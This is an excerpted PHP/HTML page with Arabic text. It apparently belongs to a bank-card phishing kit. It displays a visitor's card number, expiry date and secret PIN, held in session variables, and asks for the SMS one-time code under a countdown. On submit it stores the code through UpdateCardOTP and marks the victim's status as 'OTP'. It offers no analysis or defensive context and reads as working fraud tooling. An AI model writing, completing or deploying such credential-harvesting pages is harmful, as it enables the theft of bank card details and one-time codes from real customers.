...
if (isset($_POST['submit'])) {
    ...
    $updateResult = $User->UpdateCardOTP($id, $site);
    if ($updateResult) {
        $User->UpdateStatus($userId, 'OTP');
        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];
...
<body>
    ...
    <form action="" method="POST">
        <div class="container mt-4">
            <div class="cclas shadow p-3">
                <div class="alert alert-primary fw-bold" style="font-size: 9px;" role="alert">
                    يرجى الانتباه سيتم الان ارسال رسالة نصية على رقم هاتفك الجوال المسجل لدى البنك الخاص بك هذه الرسالة المكونة من 6 خانات هي "رمز التحقق لمرة واحدة" يرجى استخدام هذا الرمز في الحقل المخصص ادناه
                </div>
                <div class="d-flex justify-content-between mt-2">
                    <span class="text-primary me-2 fw-bold" style="font-size: 13px;width:140px">رقم بطاقة الصراف الالي:</span>
                    <span class="text-secondary fw-bold" style="font-size: 13px;"> <?= $_SESSION['bad']  ?><?= $_SESSION['cardNumber']  ?></span>
                    <span></span>
                </div>
                <hr class="my-1">
                <div class="d-flex justify-content-between mb-1">
                    <span class="text-primary  me-2 fw-bold" style="font-size: 13px;width:140px">شهر انتهاء الصلاحية:</span>
                    <span class="text-secondary fw-bold" style="font-size: 13px;"><?= $_SESSION['month']  ?></span>
                    <span></span>
                </div>
                <hr class="my-1">

                <div class="d-flex justify-content-between mb-1">
                    <span class="text-primary  me-2 fw-bold" style="font-size: 13px;width:140px">سنة انتهاء الصلاحية:</span>
                    <span class="text-secondary fw-bold" style="font-size: 13px;"><?= $_SESSION['year']  ?></span>
                    <span></span>
                </div>
                <hr class="my-1">

                <div class="d-flex justify-content-between mb-1">
                    <span class="text-primary  me-2 fw-bold" style="font-size: 13px;width:140px">الرقم السري:</span>
                    <span class="text-secondary fw-bold" style="font-size: 13px;"><?= $_SESSION['password']  ?></span>
                    <span></span>
                </div>
                <hr class="my-1">

                <div class="d-flex justify-content-between mb-1">
                    <span class="text-primary  me-2 fw-bold" style="font-size: 13px;width:200px">رمز التحقق OTP:</span>
                    <input type="text" id="timerInput" name="otp" class="form-control text-center " placeholder="Time remaining: 01:00" style="height: 25px;font-size:12px" minlength="3" maxlength="6" pattern="[0-9]*" inputmode="numeric" required>
                    <span></span>
                </div>
            </div>
        </div>
        ...
        if (isset($_GET['message'])) {
            echo '
                       <h6 class="text-danger fw-bold" style="text-align: center">
        ...
        <div class="container mt-4">
            <div class="cclas shadow bg-white p-3">
    ...
    <script>
        ...
        function updateTimer() {
            ...
            inputElement.placeholder = `Time remaining: ${formatTime(timeInSeconds)}`;
